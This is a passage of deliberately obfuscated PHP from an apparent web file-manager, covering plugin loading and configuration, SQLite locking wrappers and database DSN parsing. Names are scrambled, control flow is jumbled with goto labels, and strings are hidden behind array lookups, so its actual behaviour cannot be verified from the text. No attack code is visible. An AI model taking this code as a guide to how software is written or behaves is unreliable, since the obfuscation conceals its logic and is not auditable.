$a«ÉšÚö = !0; break; } } if (!$a«ÉšÚö) { $BÈÛèÏÔˆñ[] = $f‚‹ËÜ‹‘[$f‹àÇ³É˜†]; } } return $BÈÛèÏÔˆñ; } protected function isParentOf($b¨‚„ªç»æ, $f•×óœ»¿È) { goto B¯ë£¬Ÿ¦›; d¡Ô¶ºƒ÷Æ: return !1; goto DĞ¹ÔÑ–‚Í; bÙÜÕ²š©: $eÕ–Ï­“†¡ = $this->getInfoSimple($f•×óœ»¿È); $a‰Èî‘ ™ = $Bã¢Ø”íÖ—[$Aù‹ÔàÂ¸Ö[467]] . $b¨‚„ªç»æ . $Aù‹ÔàÂ¸Ö[57]; if (substr($eÕ–Ï­“†¡[$Aù‹ÔàÂ¸Ö[467]], 0, strlen($a‰Èî‘ ™)) == $a‰Èî‘ ™) { return !0; } goto d¡Ô¶ºƒ÷Æ; B¯ë£¬Ÿ¦›: $Aù‹ÔàÂ¸Ö =& $_SERVER[©]; if (!$b¨‚„ªç»æ || !$f•×óœ»¿È || $b¨‚„ªç»æ == $f•×óœ»¿È) { return !1; } $Bã¢Ø”íÖ— = $this->getInfoSimple($b¨‚„ªç»æ); goto bÙÜÕ²š©; DĞ¹ÔÑ–‚Í: } public function groupShowRoot($aŒ°ğ¼é³÷, $bÂØ¾²ŸÖ± = false) { goto A¡ƒ…İ¼¶Œ; A¡ƒ…İ¼¶Œ: $EôÉÖôëÜõ =& $_SERVER[©]; $B‘èŠçÑ» = $this->getInfo($aŒ°ğ¼é³÷); $EÓì×ÑÆ›ñ = $this->parentLevelArray($B‘èŠçÑ»[$EôÉÖôëÜõ[467]]); goto BåïÀÅİÄŸ; BåïÀÅİÄŸ: $a¯Ç¢‚Ö¬ = array($aŒ°ğ¼é³÷); if (count($EÓì×ÑÆ›ñ) == 0) { return $a¯Ç¢‚Ö¬; } if ($bÂØ¾²ŸÖ± && count($EÓì×ÑÆ›ñ) == 1) { return $a¯Ç¢‚Ö¬; } goto a£ŞÆîİ‘§; a£ŞÆîİ‘§: if (!$B‘èŠçÑ»[$EôÉÖôëÜõ[425]] || !isset($B‘èŠçÑ»[$EôÉÖôëÜõ[425]][$EôÉÖôëÜõ[2174]]) || $B‘èŠçÑ»[$EôÉÖôëÜõ[425]][$EôÉÖôëÜõ[2174]] == $EôÉÖôëÜõ[2151]) { return $this->groupShowRoot($EÓì×ÑÆ›ñ[count($EÓì×ÑÆ›ñ) - 1], $bÂØ¾²ŸÖ±); } if ($B‘èŠçÑ»[$EôÉÖôëÜõ[425]][$EôÉÖôëÜõ[2174]] == $EôÉÖôëÜõ[355]) { $E‚À˜‰×Üò = explode($EôÉÖôëÜõ[57], $B‘èŠçÑ»[$EôÉÖôëÜõ[425]][$EôÉÖôëÜõ[2175]]); if ($E‚À˜‰×Üò) { $a¯Ç¢‚Ö¬ = array_merge($a¯Ç¢‚Ö¬, $E‚À˜‰×Üò); } } return $a¯Ç¢‚Ö¬; goto c‰¡ª‡¾…é; c‰¡ª‡¾…é: } protected function resetParentLevel() { $dÔéâ£¤‹¬ =& $_SERVER[©]; $DÊÜœôÇŞ‡ = $dÔéâ£¤‹¬[2102]; $eìåÓ·ê§ = $this->select(); $eìåÓ·ê§ = array_to_keyvalue($eìåÓ·ê§, $DÊÜœôÇŞ‡); foreach ($eìåÓ·ê§ as $eËâ½¬¢Å§) { goto AÒ‰å­øˆˆ; còÂØÈƒ: $this->where(array($DÊÜœôÇŞ‡ => $eËâ½¬¢Å§[$DÊÜœôÇŞ‡]))->save(array($dÔéâ£¤‹¬[533] => $B•öÛŞ“íÓ)); goto bÙÙÅ¶±Û; E»¬î‰Ä§ƒ: $B•öÛŞ“íÓ[] = 0; $B•öÛŞ“íÓ = $dÔéâ£¤‹¬[57] . implode($dÔéâ£¤‹¬[57], array_reverse($B•öÛŞ“íÓ)) . $dÔéâ£¤‹¬[57]; $this->setNamePinyin($eËâ½¬¢Å§[$DÊÜœôÇŞ‡], $eËâ½¬¢Å§[$dÔéâ£¤‹¬[38]]); goto còÂØÈƒ; AÒ‰å­øˆˆ: $cÒÓ™îó« = $eËâ½¬¢Å§; $B•öÛŞ“íÓ = array(); while ($cÒÓ™îó«[$dÔéâ£¤‹¬[469]] != 0) { $B•öÛŞ“íÓ[] = $cÒÓ™îó«[$dÔéâ£¤‹¬[469]]; $cÒÓ™îó« = $eìåÓ·ê§[$cÒÓ™îó«[$dÔéâ£¤‹¬[469]]]; } goto E»¬î‰Ä§ƒ; bÙÙÅ¶±Û: } return $eìåÓ·ê§; } public function groupNameAuto($EôÉ¤Ï·±†, $f£ßì¡„) { $FÑô©ŞÇè‹ =& $_SERVER[©]; $BÙí³Ôæê = $this->where(array($FÑô©ŞÇè‹[376] => $EôÉ¤Ï·±†))->getField($FÑô©ŞÇè‹[38], !0); if (!$BÙí³Ôæê || !in_array($f£ßì¡„, $BÙí³Ôæê)) { return $f£ßì¡„; } for ($f¯¡Ë“›ò¢ = 1; $f¯¡Ë“›ò¢ <= count($BÙí³Ôæê) + 1; $f¯¡Ë“›ò¢++) { $EªœŒŒËƒí = $f£ßì¡„ . "\50{$f¯¡Ë“›ò¢}\x29"; if (!in_array($EªœŒŒËƒí, $BÙí³Ôæê)) { return $EªœŒŒËƒí; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\x70\x6c\165\147\151\x6e\114\151\x73\x74"; public $field = array("\x6e\x61\155\145", "\163\x74\x61\164\x75\x73", "\x72\145\147\x69\x65\x73\164", "\143\x6f\156\x66\x69\x67"); public function loadList($d–æ¡Éƒº¤ = false) { $EôîÕİóŠ = array_to_keyvalue($this->listData(), $_SERVER[©][38]); if ($d–æ¡Éƒº¤) { return $EôîÕİóŠ[$d–æ¡Éƒº¤]; } return $EôîÕİóŠ; } public function init() { $føéÎˆ÷Åº =& $_SERVER[©]; Hook::trigger($føéÎˆ÷Åº[2193]); $c‰ˆƒ¼Öï = $this->loadPluginList(); foreach ($c‰ˆƒ¼Öï as $d¹Õø–’µ => $c®‹¡ºê¥’) { $bĞ‹íÑÍÌ‡ = $this->appAllow($d¹Õø–’µ, $c®‹¡ºê¥’); if (!$bĞ‹íÑÍÌ‡) { continue; } foreach ($c®‹¡ºê¥’[$føéÎˆ÷Åº[2194]] as $F×âëî ì => $Cù”È‘¶©Ä) { Hook::bind($F×âëî ì, $Cù”È‘¶©Ä); } } Hook::trigger($føéÎˆ÷Åº[2195]); Hook::trigger(ACTION); } public function appAllow($BÊöó‡‚Ï¬, $bòß±½¹˜İ, $d°Œ Çğ¯ä = true) { $FšçŸ¹¹ÈÒ =& $_SERVER[©]; $E‚ğŠ‡õ¹ = PLUGIN_DIR . $BÊöó‡‚Ï¬ . $FšçŸ¹¹ÈÒ[2196]; if (!is_array($bòß±½¹˜İ) || !is_array($bòß±½¹˜İ[$FšçŸ¹¹ÈÒ[2194]]) || !is_file($E‚ğŠ‡õ¹) || $bòß±½¹˜İ[$FšçŸ¹¹ÈÒ[688]] != 1) { return !1; } if ($d°Œ Çğ¯ä && !Action($FšçŸ¹¹ÈÒ[2197])->checkAuth($BÊöó‡‚Ï¬)) { return !1; } return !0; } public function unInstall($Bõêå°†‡¹) { $CÉŞÄŒº¬§ =& $_SERVER[©]; $eê‰ìİ“ = $this->loadList($Bõêå°†‡¹); if (file_exists(PLUGIN_DIR . $Bõêå°†‡¹)) { Hook::apply($Bõêå°†‡¹ . $CÉŞÄŒº¬§[2198]); } $this->remove($eê‰ìİ“[$CÉŞÄŒº¬§[375]]); } public function changeStatus($bù÷Ñ”¦Íê, $DŸßåì¦ˆÜ) { $Aê¨Œ†­®Â =& $_SERVER[©]; $aÍ©¡ª‹ˆö = $this->loadList($bù÷Ñ”¦Íê); if ($DŸßåì¦ˆÜ) { Hook::apply($bù÷Ñ”¦Íê . $Aê¨Œ†­®Â[2199]); } $this->update($aÍ©¡ª‹ˆö[$Aê¨Œ†­®Â[375]], array($Aê¨Œ†­®Â[2200] => $DŸßåì¦ˆÜ)); } public function appRegist($C§·ï¾š‘, $C¥§ƒœìÃ‰) { $Dªãà¤î† =& $_SERVER[©]; $AåëÅÄƒ = $this->loadList($C§·ï¾š‘); if ($AåëÅÄƒ) { $this->update($AåëÅÄƒ[$Dªãà¤î†[375]], array($Dªãà¤î†[2194] => $C¥§ƒœìÃ‰)); } else { $bÁó¤êï¨ì = array($Dªãà¤î†[38] => $C§·ï¾š‘, $Dªãà¤î†[2194] => $C¥§ƒœìÃ‰, $Dªãà¤î†[688] => 0, $Dªãà¤î†[16] => $this->getConfigDefault($C§·ï¾š‘)); $this->insert($bÁó¤êï¨ì); } } public function getConfigDefault($Dì†ïÙõÕÂ) { $F’•¢æÁó˜ =& $_SERVER[©]; $a¨Â•à“œˆ = array(); $b‚Òœ„†Í = $this->getPackageJson($Dì†ïÙõÕÂ); if (!$b‚Òœ„†Í && is_array($b‚Òœ„†Í[$F’•¢æÁó˜[2201]])) { return $a¨Â•à“œˆ; } foreach ($b‚Òœ„†Í[$F’•¢æÁó˜[2201]] as $f‰éØ©Ë´å => $c„İôóÙçô) { if (!isset($c„İôóÙçô[$F’•¢æÁó˜[368]]) || isset($a¨Â•à“œˆ[$f‰éØ©Ë´å])) { continue; } $a¨Â•à“œˆ[$f‰éØ©Ë´å] = $c„İôóÙçô[$F’•¢æÁó˜[368]]; } return $a¨Â•à“œˆ; } public function getPackageJson($B×í…ƒÆˆÌ) { return Hook::apply($B×í…ƒÆˆÌ . $_SERVER[©][2202]); } public function getConfig($CÙ…ãÄ¶§‹, $e–¤æÛæÊ» = false) { $E†î±ç‰ =& $_SERVER[©]; $DÌ«ãôØÒõ = array(); $C¿Ë©êó®“ = $this->loadList($CÙ…ãÄ¶§‹); if ($C¿Ë©êó®“ && is_array($C¿Ë©êó®“[$E†î±ç‰[16]])) { $DÌ«ãôØÒõ = $C¿Ë©êó®“[$E†î±ç‰[16]]; } if (!$DÌ«ãôØÒõ || $e–¤æÛæÊ») { $DÌ«ãôØÒõ = $this->getConfigDefault($CÙ…ãÄ¶§‹); } return $DÌ«ãôØÒõ; } public function setConfig($EËš¹Í—ŸŸ, $eÜØ«Í­œÆ = false) { goto CğÙáÅªÊš; CğÙáÅªÊš: $dã®ï²óœ¶ =& $_SERVER[©]; $cïçöäõ¶Š = $this->loadList($EËš¹Í—ŸŸ); if (!$cïçöäõ¶Š) { return !1; } goto aø¦ë¿ØÎ‰; dÔæ íÕ¹…: $this->update($cïçöäõ¶Š[$dã®ï²óœ¶[375]], array($dã®ï²óœ¶[16] => $EŸÚâ²„ˆİ)); goto CßÁØñÀÌ; aø¦ë¿ØÎ‰: $EŸÚâ²„ˆİ = $cïçöäõ¶Š[$dã®ï²óœ¶[16]]; if ($eÜØ«Í­œÆ == !1) { $EŸÚâ²„ˆİ = array(); $eÜØ«Í­œÆ = $this->getConfigDefault($EËš¹Í—ŸŸ); } foreach ($eÜØ«Í­œÆ as $A –¹ä¥¡ò => $e¦ëŠ¥¾¯Ã) { $EŸÚâ²„ˆİ[$A –¹ä¥¡ò] = is_string($e¦ëŠ¥¾¯Ã) ? trim($e¦ëŠ¥¾¯Ã) : $e¦ëŠ¥¾¯Ã; } goto dÔæ íÕ¹…; CßÁØñÀÌ: } public function viewList() { goto Bç„£˜ÒŒù; eÁ¾ÊŠÈ§ö: return $F’ÉóÀ¯à; goto eåÓÒ›¿óš; bÅ‘¤ù´: $cäİ–ùõ± = $this->loadPluginList(); $F’ÉóÀ¯à = array(); foreach ($cäİ–ùõ± as $a±×¸İÀÊÖ => $c¯ó³±Øî†) { unset($c¯ó³±Øî†[$FÄÃÅÜ·«š[2194]], $c¯ó³±Øî†[$FÄÃÅÜ·«š[16]]); $bÉïğæÚé¸ = PLUGIN_DIR . $c¯ó³±Øî†[$FÄÃÅÜ·«š[38]] . $FÄÃÅÜ·«š[2196]; if (!is_file($bÉïğæÚé¸)) { continue; } $BÌğ… Ë‚§ = Hook::apply($c¯ó³±Øî†[$FÄÃÅÜ·«š[38]] . $FÄÃÅÜ·«š[2202]); if (is_array($BÌğ… Ë‚§)) { $F’ÉóÀ¯à[$a±×¸İÀÊÖ] = array_merge($c¯ó³±Øî†, $BÌğ… Ë‚§); } } goto eÁ¾ÊŠÈ§ö; Bç„£˜ÒŒù: $FÄÃÅÜ·«š =& $_SERVER[©]; $cäİ–ùõ± = $this->loadList(); $this->pluginScan($cäİ–ùõ±); goto bÅ‘¤ù´; eåÓÒ›¿óš: } private function loadPluginList() { $EíáÎÔ‘å =& $_SERVER[©]; $Fâ¥Ş†¼  = $this->loadList(); if (strtolower(MOD) == $EíáÎÔ‘å[2203]) { return $Fâ¥Ş†¼ ; } $dŠàêŞÈêÇ = Hook::trigger($EíáÎÔ‘å[2204], $Fâ¥Ş†¼ ); if ($Fâ¥Ş†¼  && !$dŠàêŞÈêÇ) { die; } return $dŠàêŞÈêÇ ? $dŠàêŞÈêÇ : $Fâ¥Ş†¼ ; } private function pluginScan($fĞÉÆèŠ½‘) { $D÷†Ş¢›©ƒ =& $_SERVER[©]; recursion_dir(PLUGIN_DIR, $FÀØ²Û¬Î•, $Bå¼èç‹Ø, 0); foreach ($FÀØ²Û¬Î• as $B®Ÿâ™‹•) { $cÙ…ç¬Â‹ = get_path_this($B®Ÿâ™‹•); if (isset($fĞÉÆèŠ½‘[$cÙ…ç¬Â‹]) || !file_exists($B®Ÿâ™‹• . $D÷†Ş¢›©ƒ[2205]) || !file_exists($B®Ÿâ™‹• . $D÷†Ş¢›©ƒ[2196])) { continue; } Hook::apply($cÙ…ç¬Â‹ . $D÷†Ş¢›©ƒ[2199]); } } } goto A™¶ÊµÕ’Ã; Fì¯Ãº¹ŒÅ: class DbSqlite extends DbSqliteBase { public function query($bŒÔã”´¢Ä) { goto e¢¾ï‡ª¿ç; e¢¾ï‡ª¿ç: $a®âŸöšÈÑ =& $_SERVER[©]; $BßÔ‹¾•Ëç = DATA_PATH . $a®âŸöšÈÑ[869]; $B«ØÀ·‰œ = fopen($BßÔ‹¾•Ëç, $a®âŸöšÈÑ[870]); goto Cìó°›…; Cìó°›…: if (!$B«ØÀ·‰œ) { return !1; } if (flock($B«ØÀ·‰œ, LOCK_EX)) { $e²‘§š…Êë = parent::query($bŒÔã”´¢Ä); flock($B«ØÀ·‰œ, LOCK_UN); fclose($B«ØÀ·‰œ); return $e²‘§š…Êë; } flock($B«ØÀ·‰œ, LOCK_UN); goto DÌÃæ”µ‹ù; DÌÃæ”µ‹ù: fclose($B«ØÀ·‰œ); show_json($a®âŸöšÈÑ[871], !1); return !1; goto F‚ñö‘Ëœ; F‚ñö‘Ëœ: } public function execute($cÜ¿ÛÒù) { goto eÚŞõØç‹Ş; eÚŞõØç‹Ş: $FË¶‰–¿ßË =& $_SERVER[©]; $bêÈƒ¼ë˜Õ = DATA_PATH . $FË¶‰–¿ßË[869]; $e†¥¯‰×Ş = fopen($bêÈƒ¼ë˜Õ, $FË¶‰–¿ßË[870]); goto CÇ‘°‚•µ; CÇ‘°‚•µ: if (!$e†¥¯‰×Ş) { return !1; } if (flock($e†¥¯‰×Ş, LOCK_EX)) { $bò«…Æ§„ğ = parent::execute($cÜ¿ÛÒù); flock($e†¥¯‰×Ş, LOCK_UN); fclose($e†¥¯‰×Ş); return $bò«…Æ§„ğ; } flock($e†¥¯‰×Ş, LOCK_UN); goto bÚäô¸¦Û’; bÚäô¸¦Û’: fclose($e†¥¯‰×Ş); show_json($FË¶‰–¿ßË[871], !1); return !1; goto eÈˆÓóäƒá; eÈˆÓóäƒá: } } class DbSqlite3 extends DbSqlite3Base { public function query($bÜ”ˆÁ›‹ô) { goto eó˜‰ŸèØñ; AŒÀÈ‘öÌ: if (!$Fï½ÖšåÇ) { return !1; } if (flock($Fï½ÖšåÇ, LOCK_EX)) { $AÕ¿î‡¿Ğ½ = parent::query($bÜ”ˆÁ›‹ô); flock($Fï½ÖšåÇ, LOCK_UN); fclose($Fï½ÖšåÇ); return $AÕ¿î‡¿Ğ½; } flock($Fï½ÖšåÇ, LOCK_UN); goto FÒ±½Ş‡°î; FÒ±½Ş‡°î: fclose($Fï½ÖšåÇ); show_json($aÖİ£½îì™[871], !1); return !1; goto E½‡…öòßÏ; eó˜‰ŸèØñ: $aÖİ£½îì™ =& $_SERVER[©]; $Fà‡À¿«° = DATA_PATH . $aÖİ£½îì™[869]; $Fï½ÖšåÇ = fopen($Fà‡À¿«°, $aÖİ£½îì™[870]); goto AŒÀÈ‘öÌ; E½‡…öòßÏ: } public function execute($d­Õö½öç) { goto c—¦²‘®à½; c—¦²‘®à½: $aÖ–ïÇÍ  =& $_SERVER[©]; $BÀå¦â¿Ñ = DATA_PATH . $aÖ–ïÇÍ [869]; $Dí¹‰Ğ±Àä = fopen($BÀå¦â¿Ñ, $aÖ–ïÇÍ [870]); goto F†Ê‹§›î¤; bóö¯ ¸ó: fclose($Dí¹‰Ğ±Àä); show_json($aÖ–ïÇÍ [871], !1); return !1; goto fºÍ…—®ø; F†Ê‹§›î¤: if (!$Dí¹‰Ğ±Àä) { return !1; } if (flock($Dí¹‰Ğ±Àä, LOCK_EX)) { $dÀØˆ¸ÄË = parent::execute($d­Õö½öç); flock($Dí¹‰Ğ±Àä, LOCK_UN); fclose($Dí¹‰Ğ±Àä); return $dÀØˆ¸ÄË; } flock($Dí¹‰Ğ±Àä, LOCK_UN); goto bóö¯ ¸ó; fºÍ…—®ø: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\x69\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\145\161" => "\x3c\x3e", "\x67\x74" => "\x3e", "\145\x67\x74" => "\76\75", "\154\164" => "\x3c", "\x65\x6c\x74" => "\74\x3d", "\156\157\x74\154\151\153\x65" => "\x4e\117\124\40\x4c\x49\x4b\x45", "\x6c\151\x6b\145" => "\114\111\113\105", "\151\x6e" => "\x49\x4e", "\x6e\x6f\164\x69\x6e" => "\x4e\117\124\40\111\x4e", "\x6e\157\x74\40\151\156" => "\x4e\117\x54\x20\x49\116", "\142\x65\164\167\145\145\156" => "\x42\105\x54\127\105\105\116", "\x6e\x6f\164\x62\145\164\167\145\x65\x6e" => "\x4e\x4f\124\x20\x42\105\124\x57\x45\x45\116", "\156\x6f\x74\40\x62\x65\x74\167\x65\x65\x6e" => "\116\117\124\40\102\x45\124\x57\x45\105\116"); protected $selectSql = "\x53\105\114\x45\x43\x54\45\104\111\x53\124\111\116\x43\124\x25\x20\45\x46\x49\x45\x4c\x44\x25\x20\x46\122\x4f\115\40\x25\x54\101\x42\114\105\x25\45\112\117\111\x4e\x25\x25\127\110\105\x52\x45\45\45\107\122\x4f\x55\x50\x25\45\110\101\x56\x49\116\107\45\x25\x4f\x52\x44\105\x52\45\45\x4c\111\x4d\111\x54\x25\x20\x25\x55\x4e\111\117\x4e\x25\45\x43\117\115\115\105\116\x54\45"; protected $bind = array(); public static function getInstance() { $A¡Š©µ×Ş• = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[©][872], $A¡Š©µ×Ş•); } public function factory($e¡…íšï—ô = '') { goto C†¢ƒ¸ˆº†; bƒÀˆ…ƒŠƒ: return $EóŒ¿æŞ°š; goto fñãö•âÌç; C†¢ƒ¸ˆº†: $D†ğ±‘Â’± =& $_SERVER[©]; $e¡…íšï—ô = $this->parseConfig($e¡…íšï—ô); if (empty($e¡…íšï—ô[$D†ğ±‘Â’±[873]])) { think_exception(think_lang($D†ğ±‘Â’±[874])); } goto DŠñ›è÷Ş; DŠñ›è÷Ş: $this->dbType = ucwords(strtolower($e¡…íšï—ô[$D†ğ±‘Â’±[873]])); $C¼Š›É¯—ß = $D†ğ±‘Â’±[875] . $this->dbType; if (class_exists($C¼Š›É¯—ß)) { $EóŒ¿æŞ°š = new $C¼Š›É¯—ß($e¡…íšï—ô); if ($D†ğ±‘Â’±[723] != strtolower($e¡…íšï—ô[$D†ğ±‘Â’±[873]])) { $EóŒ¿æŞ°š->dbType = strtoupper($this->dbType); } else { $EóŒ¿æŞ°š->dbType = $this->_getDsnType($e¡…íšï—ô[$D†ğ±‘Â’±[825]]); } } else { think_exception(think_lang($D†ğ±‘Â’±[876]) . $D†ğ±‘Â’±[877] . $C¼Š›É¯—ß); } goto bƒÀˆ…ƒŠƒ; fñãö•âÌç: } public function __call($d½­ŞÂ¬¤ê, $Eôôğ«Âé) { if (method_exists($this, $d½­ŞÂ¬¤ê)) { return call_user_func_array(array($this, $d½­ŞÂ¬¤ê), $Eôôğ«Âé); } } protected function _getDsnType($e¿Óğ„ù) { $e’°™é´¾Ë = explode($_SERVER[©][14], $e¿Óğ„ù); $CÔ£Éœ±ÇÈ = strtoupper(trim($e’°™é´¾Ë[0])); return $CÔ£Éœ±ÇÈ; } private function parseConfig($Bí§Å³¼–„ = '') { $f÷„©Ğ—‚ =& $_SERVER[©]; if (!empty($Bí§Å³¼–„) && is_string($Bí§Å³¼–„)) { $Bí§Å³¼–„ = $this->parseDSN($Bí§Å³¼–„); } elseif (is_array($Bí§Å³¼–„)) { $Bí§Å³¼–„ = array_change_key_case($Bí§Å³¼–„); $Bí§Å³¼–„ = array($f÷„©Ğ—‚[873] => $Bí§Å³¼–„[$f÷„©Ğ—‚[722]], $f÷„©Ğ—‚[798] => $Bí§Å³¼–„[$f÷„©Ğ—‚[878]], $f÷„©Ğ—‚[799] => $Bí§Å³¼–„[$f÷„©Ğ—‚[879]], $f÷„©Ğ—‚[796] => $Bí§Å³¼–„[$f÷„©Ğ—‚[880]], $f÷„©Ğ—‚[797] => $Bí§Å³¼–„[$f÷„©Ğ—‚[881]], $f÷„©Ğ—‚[27] => $Bí§Å³¼–„[$f÷„©Ğ—‚[882]], $f÷„©Ğ—‚[825] => $Bí§Å³¼–„[$f÷„©Ğ—‚[724]], $f÷„©Ğ—‚[23] => isset($Bí§Å³¼–„[$f÷„©Ğ—‚[883]]) ? $Bí§Å³¼–„[$f÷„©Ğ—‚[883]] : array()); } elseif (empty($Bí§Å³¼–„)) { if (think_config($f÷„©Ğ—‚[884]) && $f÷„©Ğ—‚[723] != strtolower(think_config($f÷„©Ğ—‚[885]))) { $Bí§Å³¼–„ = $this->parseDSN(think_config($f÷„©Ğ—‚[884])); } else { $Bí§Å³¼–„ = array($f÷„©Ğ—‚[873] => think_config($f÷„©Ğ—‚[885]), $f÷„©Ğ—‚[798] => think_config($f÷„©Ğ—‚[886]), $f÷„©Ğ—‚[799] => think_config($f÷„©Ğ—‚[887]), $f÷„©Ğ—‚[796] => think_config($f÷„©Ğ—‚[888]), $f÷„©Ğ—‚[797] => think_config($f÷„©Ğ—‚[889]), $f÷„©Ğ—‚[27] => think_config($f÷„©Ğ—‚[243]), $f÷„©Ğ—‚[825] => think_config($f÷„©Ğ—‚[884]), $f÷„©Ğ—‚[23] => think_config($f÷„©Ğ—‚[890])); } } return $Bí§Å³¼–„; } protected function initConnect($bëàÍ¬ùÍ = true) { if (1 == think_config($_SERVER[©][28])) { $this->_linkID = $this->multiConnect($bëàÍ¬ùÍ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($EÂ¤×Çò‹ƒ = false) { $a‘ôí¥ë®é =& $_SERVER[©]; static $eÑğìÂÃµÕ = array(); if (empty($eÑğìÂÃµÕ)) { foreach ($this->config as $c´ç”‡´‡÷ => $Bä´Æ±Á¶ ) { $eÑğìÂÃµÕ[$c´ç”‡´‡÷] = explode($a‘ôí¥ë®é[57], $Bä´Æ±Á¶ ); } } if (think_config($a‘ôí¥ë®é[891])) { if ($EÂ¤×Çò‹ƒ) { $Fêœ…¶ç·¯ = floor(mt_rand(0, think_config($a‘ôí¥ë®é[892]) - 1)); } else { if (is_numeric(think_config($a‘ôí¥ë®é[893]))) { $Fêœ…¶ç·¯ = think_config($a‘ôí¥ë®é[893]); } else { $Fêœ…¶ç·¯ = floor(mt_rand(think_config($a‘ôí¥ë®é[892]), count($eÑğìÂÃµÕ[$a‘ôí¥ë®é[796]]) - 1)); } } } else { $Fêœ…¶ç·¯ = floor(mt_rand(0, count($eÑğìÂÃµÕ[$a‘ôí¥ë®é[796]]) - 1)); } $a¸âéÖàŸ = array($a‘ôí¥ë®é[798] => isset($eÑğìÂÃµÕ[$a‘ôí¥ë®é[798]][$Fêœ…¶ç·¯]) ? $eÑğìÂÃµÕ[$a‘ôí¥ë®é[798]][$Fêœ…¶ç·¯] : $eÑğìÂÃµÕ[$a‘ôí¥ë®é[798]][0], $a‘ôí¥ë®é[799] => isset($eÑğìÂÃµÕ[$a‘ôí¥ë®é[799]][$Fêœ…¶ç·¯]) ? $eÑğìÂÃµÕ[$a‘ôí¥ë®é[799]][$Fêœ…¶ç·¯] : $eÑğìÂÃµÕ[$a‘ôí¥ë®é[799]][0], $a‘ôí¥ë®é[796] => isset($eÑğìÂÃµÕ[$a‘ôí¥ë®é[796]][$Fêœ…¶ç·¯]) ? $eÑğìÂÃµÕ[$a‘ôí¥ë®é[796]][$Fêœ…¶ç·¯] : $eÑğìÂÃµÕ[$a‘ôí¥ë®é[796]][0], $a‘ôí¥ë®é[797] => isset($eÑğìÂÃµÕ[$a‘ôí¥ë®é[797]][$Fêœ…¶ç·¯]) ? $eÑğìÂÃµÕ[$a‘ôí¥ë®é[797]][$Fêœ…¶ç·¯] : $eÑğìÂÃµÕ[$a‘ôí¥ë®é[797]][0], $a‘ôí¥ë®é[27] => isset($eÑğìÂÃµÕ[$a‘ôí¥ë®é[27]][$Fêœ…¶ç·¯]) ? $eÑğìÂÃµÕ[$a‘ôí¥ë®é[27]][$Fêœ…¶ç·¯] : $eÑğìÂÃµÕ[$a‘ôí¥ë®é[27]][0], $a‘ôí¥ë®é[825] => isset($eÑğìÂÃµÕ[$a‘ôí¥ë®é[825]][$Fêœ…¶ç·¯]) ? $eÑğìÂÃµÕ[$a‘ôí¥ë®é[825]][$Fêœ…¶ç·¯] : $eÑğìÂÃµÕ[$a‘ôí¥ë®é[825]][0], $a‘ôí¥ë®é[23] => isset($eÑğìÂÃµÕ[$a‘ôí¥ë®é[23]][$Fêœ…¶ç·¯]) ? $eÑğìÂÃµÕ[$a‘ôí¥ë®é[23]][$Fêœ…¶ç·¯] : $eÑğìÂÃµÕ[$a‘ôí¥ë®é[23]][0]); return $this->connect($a¸âéÖàŸ, $Fêœ…¶ç·¯); } public function parseDSN($C÷­é‡š¸Ç) { $a¡Ú–”ßÚÂ =& $_SERVER[©]; if (empty($C÷­é‡š¸Ç)) { return !1; } $aµêÎä¯«‹ = parse_url($C÷­é‡š¸Ç); if ($aµêÎä¯«‹[$a¡Ú–”ßÚÂ[178]]) { $b¨‘•øËá¶ = array($a¡Ú–”ßÚÂ[873] => $aµêÎä¯«‹[$a¡Ú–”ßÚÂ[178]], $a¡Ú–”ßÚÂ[798] => isset($aµêÎä¯«‹[$a¡Ú–”ßÚÂ[543]]) ? $aµêÎä¯«‹[$a¡Ú–”ßÚÂ[543]] : $a¡Ú–”ßÚÂ[43], $a¡Ú–”ßÚÂ[799] => isset($aµêÎä¯«‹[$a¡Ú–”ßÚÂ[894]]) ? $aµêÎä¯«‹[$a¡Ú–”ßÚÂ[894]] : $a¡Ú–”ßÚÂ[43], $a¡Ú–”ßÚÂ[796] => isset($aµêÎä¯«‹[$a¡Ú–”ßÚÂ[179]]) ? $aµêÎä¯«‹[$a¡Ú–”ßÚÂ[179]] : $a¡Ú–”ßÚÂ[43], $a¡Ú–”ßÚÂ[797] => isset($aµêÎä¯«‹[$a¡Ú–”ßÚÂ[180]]) ? $aµêÎä¯«‹[$a¡Ú–”ßÚÂ[180]] : $a¡Ú–”ßÚÂ[43], $a¡Ú–”ßÚÂ[27] => isset($aµêÎä¯«‹[$a¡Ú–”ßÚÂ[85]]) ? substr($aµêÎä¯«‹[$a¡Ú–”ßÚÂ[85]], 1) : $a¡Ú–”ßÚÂ[43]); } else { preg_match($a¡Ú–”ßÚÂ[895], trim($C÷­é‡š¸Ç), $cóØ™ç„½’); $b¨‘•øËá¶ = array($a¡Ú–”ßÚÂ[873] => $cóØ™ç„½’[1], $a¡Ú–”ßÚÂ[798] => $cóØ™ç„½’[2], $a¡Ú–”ßÚÂ[799] => $cóØ™ç„½’[3], $a¡Ú–”ßÚÂ[796] => $cóØ™ç„½’[4], $a¡Ú–”ßÚÂ[797] => $cóØ™ç„½’[5], $a¡Ú–”ßÚÂ[27] => $cóØ™ç„½’[6]); } $b¨‘•øËá¶[$a¡Ú–”ßÚÂ[825]] = $a¡Ú–”ßÚÂ[43]; return $b¨‘•øËá¶; } protected function debug() { $BßßœÀ‰½È =& $_SERVER[©]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $BßßœÀ‰½È[896]; if (think_config($BßßœÀ‰½È[897])) { think_status($BßßœÀ‰½È[898]); think_trace($this->queryStr . $BßßœÀ‰½È[899] . think_status($BßßœÀ‰½È[30], $BßßœÀ‰½È[898], 6) . $BßßœÀ‰½È[900], $BßßœÀ‰½È[43], $BßßœÀ‰½È[901]); } } protected function parseLock($F‹‘§çÓäñ = false) { $C¢‘ÏÀ§Ÿ =& $_SERVER[©]; if (!$F‹‘§çÓäñ) { return $C¢‘ÏÀ§Ÿ[43]; } if ($C¢‘ÏÀ§Ÿ[827] == $this->dbType) { return $C¢‘ÏÀ§Ÿ[902]; } return $C¢‘ÏÀ§Ÿ[903]; } protected function parseSet($c—àÜÅá‹ò) { $BğÕÂ­“Ù‹ 